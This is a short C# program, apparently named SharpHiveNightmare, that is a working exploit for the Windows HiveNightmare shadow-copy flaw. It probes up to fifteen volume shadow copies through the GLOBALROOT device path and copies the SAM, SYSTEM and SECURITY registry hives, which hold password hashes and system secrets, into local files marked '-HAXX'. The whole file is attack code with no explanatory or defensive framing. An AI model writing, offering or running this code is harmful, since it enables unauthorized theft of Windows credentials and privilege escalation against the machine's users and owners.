using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace SharpHiveNightmare
{
  class Program
  {

    static private void ReadFile(string source)
    {
      int CopyNumber = 1;

      string pathSource = $"\\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy{CopyNumber}\\Windows\\System32\\config\\{source}";
      while (!File.Exists(pathSource) && CopyNumber < 15)
      {
        CopyNumber++;
        pathSource = $"\\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy{CopyNumber}\\Windows\\System32\\config\\{source}";
      }
      string pathNew = source + "-HAXX";

      using (FileStream fsSource = new FileStream(pathSource,
            FileMode.Open, FileAccess.Read))
      {
        byte[] bytes = new byte[fsSource.Length];
        int numBytesToRead = (int)fsSource.Length;
        int numBytesRead = 0;
        while (numBytesToRead > 0)
        {
          int n = fsSource.Read(bytes, numBytesRead, numBytesToRead);
          if (n == 0)
            break;

          numBytesRead += n;
          numBytesToRead -= n;
        }
        numBytesToRead = bytes.Length;
        using (FileStream fsNew = new FileStream(pathNew,
            FileMode.Create, FileAccess.Write))
        {
          fsNew.Write(bytes, 0, numBytesToRead);
        }
      }
    }

    static void Main(string[] args)
    {
      ReadFile("SAM");
      ReadFile("SYSTEM");
      ReadFile("SECURITY");
    }
  }
}
